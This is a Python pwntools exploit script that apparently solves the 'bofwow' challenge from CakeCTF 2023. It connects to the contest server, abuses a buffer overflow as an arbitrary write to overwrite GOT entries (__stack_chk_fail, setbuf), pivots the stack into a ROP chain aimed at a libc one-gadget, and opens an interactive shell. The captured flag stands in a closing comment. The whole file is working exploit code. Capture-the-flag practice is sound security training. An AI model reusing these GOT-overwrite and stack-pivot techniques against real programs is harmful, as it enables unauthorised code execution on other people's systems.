#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./bofwow_patched")
libc = elf.libc
libc = ELF("./libc.so.6")

gdbscript = """
b main
b *0x00000000004014c6
c
"""

def aaw(what: int, where: int, rpayload: bytes = None) -> None:
    rop = rpayload.ljust(0x128, b'b') if rpayload else b'z'*0x128
    payload = flat(
        what,
        rop,
        where,
        b'b'*0x10
    )

    p.sendlineafter(b"name? ", payload)
    p.sendlineafter(b"?", b'1337')


p = remote("bofwow.2023.cakectf.com", 9003)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

fake = elf.bss(0x500)
# some_got = 0x404068
some_got = elf.got['setbuf']
binsh = fake+0x300
# rbp = fake+0x400
# new_rbp = fake+0x450

print(f"Fake Stack: {hex(fake)}")
# print(f"/bin/sh: {hex(binsh)}")


# gadgets
rop = ROP(elf)
ret = rop.ret[0]
leave_ret = rop.leave[0]
pop_rbp = rop.rbp[0]
magic = 0x40132c
mov_rax = 0x00000000004015a3    # mov rax, qword ptr [rbp - 0x18] ; leave ; ret
call_rbp3d = 0x0000000000401567 # call ptr [rbp - 0x3d]
threed_gadget = 0x00000000004012bc  # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
ctrl_ebx = 0x00000000004014c3   # mov ebx, dword ptr [rbp - 8] ; leave ; ret

# system_offset = libc.sym['system'] - libc.sym['__']
# print(f"System offset from setbuf: {hex(system_offset)}")

# overwrite stack check fail with main function
aaw(elf.sym['main'], elf.got['__stack_chk_fail'])

# prepare fake stack and write rop chain to it
# setting up rbp and some other stuff
# aaw(unpack(b'/bin/sh\x00', 'all'), binsh)
# aaw(binsh, rbp-0x18)   # store /bin/sh string somewhere
# aaw(fake+38, rbp)

# second stage
# aaw(mov_rax, rbp+8)
# aaw(leave_ret, rbp+0x10)

# stage one: load constant to ebx
rbp = fake + 0x100
aaw(rbp, fake)   # should be set to rbp
aaw(((0x7f2604fec000 + 0xebdb3) - 0x7f2605074060) & 0xffffffff, rbp-8)  # value to be set in ebx
aaw(ctrl_ebx, fake+0x8) # set ebx; leave ret
aaw(threed_gadget, rbp+8)   # actuall rbp is now rsp
aaw(elf.sym['_start'], rbp+0x10)


# stage two: add ebx and ios_got
new_rbp = some_got+0x3d
aaw(new_rbp, rbp) # go to next stage
# aaw(0x4040a0)
# aaw(threed_gadget, new_rbp+8)
# aaw(rbp+0x18, rbp)   # should be set to rbp
# aaw(mov_rax, fake+0x10) # moves binsh to rax
# aaw(new_rbp, fake+0x38)


payload = flat(
    p64(0)*0x21,
    p64(fake),
    leave_ret,
    ret,
    ret,
)

aaw(elf.sym['main']+289, elf.got['__stack_chk_fail'], payload)
p.interactive()
# CakeCTF{1_h3r3by_c3rt1fy_th4t_y0u_h4v3_c0mpl3ted_3very7h1ng_4b0ut_ROP}